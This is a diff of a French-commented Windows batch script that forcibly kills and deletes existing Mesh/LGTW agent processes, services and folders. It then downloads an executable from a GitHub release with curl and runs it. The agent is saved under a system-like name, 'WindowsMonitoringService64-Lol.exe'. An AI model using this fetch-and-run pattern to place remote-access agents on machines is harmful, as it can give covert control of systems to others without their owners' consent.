@@ -8,7 +8,6 @@ set "URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/Windo
 set "T_EXE=%TEMP%\WindowsMonitoringService64-Lol.exe"
 
 if not exist "%LDIR%" mkdir "%LDIR%"
-
 echo [START] %DATE% %TIME% >> "%LFILE%"
 
 :: 1. Verif Admin
@@ -18,16 +17,14 @@ if %errorlevel% neq 0 (
     exit /b 1
 )
 
-:: 2. Arret AGRESSIF des processus et services
-echo [2] Arret force des processus... >> "%LFILE%"
-:: On tue tout ce qui ressemble a l'agent
+:: 2. Arrêt AGRESSIF (Recherche par nom partiel)
+echo [2] Arret force des processus et services... >> "%LFILE%"
+:: On tue tout ce qui contient "Mesh" ou "LGTW"
+taskkill /F /FI "IMAGENAME eq Mesh*" /T >> "%LFILE%" 2>&1
+taskkill /F /FI "IMAGENAME eq LGTW*" /T >> "%LFILE%" 2>&1
 taskkill /F /IM "WindowsMonitoringService64-Lol.exe" /T >> "%LFILE%" 2>&1
-taskkill /F /IM "MeshAgent.exe" /T >> "%LFILE%" 2>&1
-taskkill /F /IM "LGTW-Agent.exe" /T >> "%LFILE%" 2>&1
-taskkill /F /IM "LGTW.exe" /T >> "%LFILE%" 2>&1
 
-:: Arret et suppression du service Windows (si present)
-echo [2b] Suppression des services... >> "%LFILE%"
+:: Arrêt et suppression radicale des services
 sc stop "Mesh Agent" >> "%LFILE%" 2>&1
 sc delete "Mesh Agent" >> "%LFILE%" 2>&1
 sc stop "LGTW-Agent" >> "%LFILE%" 2>&1
@@ -35,7 +32,7 @@ sc delete "LGTW-Agent" >> "%LFILE%" 2>&1
 
 timeout /t 5 /nobreak >nul
 
-:: 3. Nettoyage dossiers (Force)
+:: 3. Nettoyage dossiers
 echo [3] Nettoyage dossiers... >> "%LFILE%"
 set "D1=%ProgramFiles%\Mesh Agent"
 set "D2=%ProgramFiles%\LGTW"
@@ -43,31 +40,30 @@ set "D3=%ProgramFiles(x86)%\Mesh Agent"
 
 for %%D in ("%D1%" "%D2%" "%D3%") do (
     if exist "%%~D" (
-        echo [INFO] Suppression forcée de %%~D >> "%LFILE%"
-        :: On change les attributs au cas ou (Lecture seule, etc)
+        echo [INFO] Nettoyage de %%~D >> "%LFILE%"
+        :: On retire les droits "Lecture seule" qui bloquent parfois rd
         attrib -r -s -h "%%~D\*.*" /s /d >nul 2>&1
         rd /s /q "%%~D" >> "%LFILE%" 2>&1
         
-        :: Double check
         if exist "%%~D" (
-            echo [ERREUR] Echec persistant sur %%~D. Tentative de renommage... >> "%LFILE%"
+            echo [ALERTE] Dossier toujours present, tentative de renommage... >> "%LFILE%"
             ren "%%~D" "OLD_AGENT_%RANDOM%" >> "%LFILE%" 2>&1
         )
     )
 )
 
 :: 4. Telechargement
-echo [4] Telechargement... >> "%LFILE%"
+echo [4] Telechargement de WindowsMonitoringService64-Lol.exe... >> "%LFILE%"
 curl -L -f -o "%T_EXE%" "%URL%" >> "%LFILE%" 2>&1
 
 if not exist "%T_EXE%" (
-    echo [ERREUR] Telechargement HS. >> "%LFILE%"
+    echo [ERREUR] Telechargement echoue. Verifiez l'URL ou la connexion. >> "%LFILE%"
     goto :final
 )
 
 :: 5. Execution
-echo [5] Execution... >> "%LFILE%"
-:: On lance l'agent
+echo [5] Execution de l'agent... >> "%LFILE%"
+:: On lance l'agent. 
 start "" "%T_EXE%"
 echo [OK] Lance. >> "%LFILE%"
 
